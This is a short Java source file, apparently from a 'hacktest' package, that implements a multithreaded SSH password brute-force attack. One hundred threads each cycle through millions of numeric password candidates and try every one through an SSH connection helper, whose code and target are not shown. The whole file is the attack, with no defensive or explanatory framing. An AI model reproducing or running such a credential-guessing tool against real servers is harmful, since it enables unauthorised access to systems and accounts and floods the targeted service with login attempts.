import cn.wfy.util.PoorThreadPool;
import cn.wfy.hacktest.SSHConnet;

import java.util.concurrent.ThreadPoolExecutor;

public class SSHTest {
    public static void main(String[] args) {

        SSHTest sshTest = new SSHTest();
        sshTest.getContent();
    }

    private void getContent() {
        ThreadPoolExecutor connetion = PoorThreadPool.getConnetion();

        SSHConnet sshConnet = new SSHConnet();

        for (int i = 0; i < 100; i++) {

            int tempi = i;
            connetion.execute(new Runnable() {
                @Override
                public void run() {
                    for (int j = 100000; j < 10000000; j++) {
                        sshConnet.setPassword(String.valueOf(tempi) + String.valueOf(j));
                        sshConnet.getConnet();
                    }
                }
            });
        }
        connetion.shutdown();


    }


}
